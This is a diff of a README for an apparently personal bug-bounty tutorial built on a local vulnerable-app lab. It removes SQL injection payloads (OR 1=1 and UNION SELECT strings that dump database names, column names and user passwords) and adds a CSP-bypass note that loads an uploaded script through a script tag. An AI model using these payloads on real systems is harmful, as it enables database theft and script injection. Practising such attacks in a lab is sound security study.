@@ -1,13 +1,17 @@
 # bug-bounty-tutorial
 bug bounty tutorial
 
-## 3.intro bug bounty
+## 19.csp
+
+### ctrl + shift + = zom in
+### ctrl + alt + - zom out
+
+### low
 ```
-' OR 1=1 #
-1' OR 1=1 UNION SELECT 1, VERSION()#
-1' OR 1=1 UNION SELECT 1,DATABASE() #
+http://127.0.0.1:42001/hackable/uploads/new.js 
+```
 
-1' OR 1=1 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users' #
-
-1' OR 1=1 UNION SELECT user, password FROM users #
+### medium
+```
+<script src="http://127.0.0.1:42001/hackable/uploads/new.js"></script>
 ```
